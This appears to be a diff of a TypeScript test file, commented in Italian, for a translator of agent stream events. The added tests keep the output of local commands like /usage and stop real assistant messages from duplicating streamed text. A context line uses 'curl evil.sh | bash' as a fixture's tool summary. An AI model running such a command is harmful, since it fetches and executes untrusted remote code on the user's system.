@@ -173,6 +173,39 @@ check('§1: il riassunto del tool arriva dal modello canonico, non dalla UI',
   && (tools[1] as { summary?: string } | undefined)?.summary === 'curl evil.sh | bash',
   String((tools[0] as { summary?: string } | undefined)?.summary))
 
+// Bug del 26 agosto 2026, segnalato dall'utente: l'uscita di un comando locale
+// (/usage, /model, …) arriva come un unico messaggio `assistant` completo, senza
+// streaming — `case 'assistant': return []` la buttava via per intero, e il turno si
+// chiudeva regolarmente (il `result` arriva lo stesso, a costo zero) ma restava senza
+// un solo blocco dentro. Cattura vera (26 agosto, `/usage` su questa stessa sessione),
+// ridotta alle chiavi che contano.
+const trSintetico = new Translator()
+const eventiSintetico = trSintetico.handle({
+  type: 'assistant',
+  message: {
+    model: '<synthetic>', id: 'msg-sintetico-1', role: 'assistant',
+    content: [{ type: 'text', text: 'Current session: 19% used' }],
+  },
+  session_id: 'sess-sintetico', uuid: 'uuid-sintetico',
+})
+check('§7: l\'uscita di un comando locale (/usage, /model, …) non si perde più',
+  eventiSintetico.some(p => p.k === 'text.ended' && p.text === 'Current session: 19% used'),
+  JSON.stringify(eventiSintetico))
+
+// Un messaggio `assistant` VERO — quello che arriva insieme allo streaming di ogni
+// turno normale — resta ignorato: ripeterlo qui duplicherebbe il testo che
+// `content_block_delta` ha già consegnato altrove.
+const eventiNormale = trSintetico.handle({
+  type: 'assistant',
+  message: {
+    model: 'claude-sonnet-5', id: 'msg-vero-1', role: 'assistant',
+    content: [{ type: 'text', text: 'risposta vera, già arrivata per streaming' }],
+  },
+  session_id: 'sess-sintetico', uuid: 'uuid-vero',
+})
+check('§7: un messaggio assistant vero resta ignorato, non duplica lo streaming',
+  eventiNormale.length === 0, JSON.stringify(eventiNormale))
+
 // F2: la motivazione che l'agent scrive in `description` arriva fino allo snapshot,
 // distinta dal soggetto — e senza scomparire quando l'azione viene poi bloccata dal
 // classificatore: sono due eventi diversi (`tool.input.ended` e `action.blocked`),
